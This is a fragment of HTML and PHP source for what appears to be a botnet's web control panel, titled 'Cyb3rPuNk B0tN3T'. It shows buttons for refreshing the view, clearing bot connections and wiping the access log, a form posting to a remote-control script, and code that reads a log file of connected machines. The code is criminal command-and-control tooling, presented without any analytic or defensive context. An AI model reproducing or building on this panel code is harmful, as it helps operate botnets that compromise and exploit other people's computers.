...
<meta charset="UTF-8">
<title>Cyb3rPuNk B0tN3T :: ACCESS LOG </title>
...
<tr>
<td ><input type="submit" value="Atualizar" style="margin: 0px; height: 26px; line-height: 26px; padding: 0px 10px; cursor: pointer; color: rgb(255, 255, 255); font-size: 12px; font-weight: bold; background: none repeat scroll 0% 0% rgb(241, 90, 35); border: medium none; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1) inset; border-radius: 2px 2px 2px 2px; transition: all 0.3s ease-in-out 0s;" onclick="javascript: location.href='accesslog.php';"></td>


<td  align="right">
<input type="submit" value="Limpar conex&otilde;es" style="margin: 0px; height: 26px; line-height: 26px; padding: 0px 10px; cursor: pointer; color: rgb(255, 255, 255); font-size: 12px; font-weight: bold; background: none repeat scroll 0% 0% rgb(241, 90, 35); border: medium none; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1) inset; border-radius: 2px 2px 2px 2px; transition: all 0.3s ease-in-out 0s;" onclick="javascript: location.href='limparcccp.php';">
<input type="submit" value="Limpar log de acessos" style="margin: 0px; height: 26px; line-height: 26px; padding: 0px 10px; cursor: pointer; color: rgb(255, 255, 255); font-size: 12px; font-weight: bold; background: none repeat scroll 0% 0% rgb(241, 90, 35); border: medium none; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1) inset; border-radius: 2px 2px 2px 2px; transition: all 0.3s ease-in-out 0s;" onclick="javascript: location.href='limparaccesslog.php';">
</td></tr></table><br></center>

<center><form name="fmr" action="remotesxl.php?IDX=" method="post">
<table width='90%' cellpadding='2' border='0' bgcolor="#E0E0E0">
<tr><td colspan="2" align="center"><font style="color: black;"><b>ACCESS LOG</b></font></td></tr>
<!-- Exibe UID -->
<tr bgcolor="#FCFCFC"><td align="left">

<textarea id="accesslogout" name="accesslogout" cols="130" rows="15">
<?php

///////////////////////////////////////////////////////////
// Exibe log...
$arquivoTemp = "acessos/maquinas/access_log.txt";
...
var elem = document.getElementById('accesslogout');
